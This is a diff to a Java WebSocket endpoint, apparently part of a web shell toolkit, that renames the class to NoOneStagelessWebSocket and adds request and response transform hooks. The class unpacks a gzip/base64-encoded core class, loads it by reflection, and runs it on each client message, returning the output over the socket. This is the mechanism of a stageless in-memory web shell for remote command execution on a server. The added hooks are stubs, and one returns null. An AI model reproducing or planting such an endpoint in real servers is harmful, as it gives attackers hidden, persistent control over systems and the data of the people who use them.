@@ -18,7 +18,7 @@ import java.util.zip.GZIPInputStream;
  * @author ReaJason
  * @since 2025/5/9
  */
-public class NoOneWebSocketBuffer extends Endpoint implements MessageHandler.Whole<ByteBuffer> {
+public class NoOneStagelessWebSocket extends Endpoint implements MessageHandler.Whole<ByteBuffer> {
     private Session session;
     private static Class<?> coreClass = null;
     private static String coreGzipBase64;
@@ -31,10 +31,11 @@ public class NoOneWebSocketBuffer extends Endpoint implements MessageHandler.Who
                 byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
                 coreClass = reflectionDefineClass(bytes);
             }
+            byte[] payload = transformReqPayload(getArgFromContent(msg));
             ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
             Object httpChannelCore = coreClass.newInstance();
-            httpChannelCore.equals(new Object[]{msg, outputStream});
-            byte[] result = outputStream.toByteArray();
+            httpChannelCore.equals(new Object[]{payload, outputStream});
+            byte[] result = wrapResData(transformResData(outputStream.toByteArray()));
             session.getBasicRemote().sendBinary(ByteBuffer.wrap(result));
         } catch (Throwable e) {
             e.printStackTrace();
@@ -45,6 +46,22 @@ public class NoOneWebSocketBuffer extends Endpoint implements MessageHandler.Who
     public void onOpen(final Session session, EndpointConfig config) {
         this.session = session;
         session.addMessageHandler(this);
+    }
+
+    private byte[] getArgFromContent(byte[] content) {
+        return null;
+    }
+
+    private byte[] transformReqPayload(byte[] input) {
+        return input;
+    }
+
+    private byte[] wrapResData(byte[] payload) {
+        return payload;
+    }
+
+    private byte[] transformResData(byte[] payload) {
+        return payload;
     }
 
     @SuppressWarnings("all")
